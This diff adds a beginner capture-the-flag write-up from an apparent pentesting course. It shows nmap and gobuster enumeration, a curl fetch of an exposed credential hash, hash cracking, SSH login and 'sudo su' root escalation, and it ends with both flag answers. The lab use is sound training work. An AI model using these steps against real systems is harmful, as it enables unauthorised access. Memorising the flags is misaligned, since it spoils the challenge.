@@ -1,0 +1,109 @@
+
+Throughout this course, you have learned many tactics and tools to pentesting. This is where it all gets put to the test, I have put together a beginner level ctf, that contains 2 flags. Good luck and have fun!
+
+ip ---> given
+
+1. What is the user.txt ?
+2. what is the root.txt ?
+
+
+Answer:
+-------
+
+S1: ---> nmap => port 22, 80 ---> open
+
+   => We can probably enter via ssh ----------------- (i)
+   => We need username and password   ------------------------------------ (ii)
+   => we may have to crack hash to get the password ------------------------- (iii)
+   => We have to find files/folders within trgt ip ------------------------------ (iv)
+   => Now to check the content of the file we got.(use curl or browser) ------------- (v)
+   => get text within user.txt and root.txt by using sudo (probably) ------------- (vi)
+
+(i) ---> nmap => port 22, 80 ---> open
+
+(iv) ---> finding suspecious directory/file:
+
+sub1:
+-----
+
+sudo gobuster dir -u $IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+
+---->
+
+/.hta (Status: 403)
+/.hta.txt (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.txt (Status: 403)
+/index.html (Status: 200)
+______________________|
+/secret (Status: 301) |----------> Got suspecious folder, now searching within it
+----------------------|
+/server-status (Status: 403)
+
+
+sub2:
+-----
+
+sudo gobuster dir -u $IP/secret -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .txt
+
+----->
+
+/.hta (Status: 403)
+/.hta.txt (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.txt (Status: 403)
+/index.html (Status: 200)
+-------------------------|
+/secret.txt (Status: 200)|-------------> Got the suspecious file
+-------------------------|
+
+✓ (iv) ---> done
+
+(v) ---> 
+
+S1: 
+---
+
+curl $IP/secret/secret.txt
+
+-----> nyan:046385855FC9580393853D8E81F240B66FE9A7B8
+
+OR,
+
+S2:
+---
+
+browser: ip/secret/secret.txt
+
+nyan:046385855FC9580393853D8E81F240B66FE9A7B8
+
+----> We got password and username
+
+✓ (ii) and (v) ---> done
+
+
+(iii) ---> used crackstation => pass : nyan
+
+✓ (iii) ---> done
+
+
+(i) ---> ssh nyan@ip
+
+pass : nyan
+
+We performed priv escal : sudo -l , then sudo /bin/su OR, sudo su
+
+---> as : sudo -i => Sorry, user nyan is not allowed to execute '/bin/bash' as root on ubuntu.     
+     Despite of it being within sudoer file : 
+                        groups nyan  => nyan adm cdrom sudo dip plugdev lpadmin sambashare
+
+✓ (i) ---> done
+
+✓ (vi) 1. user.txt ---> supernootnoot
+
+     2. root.txt ---> congratulations!!!!
+
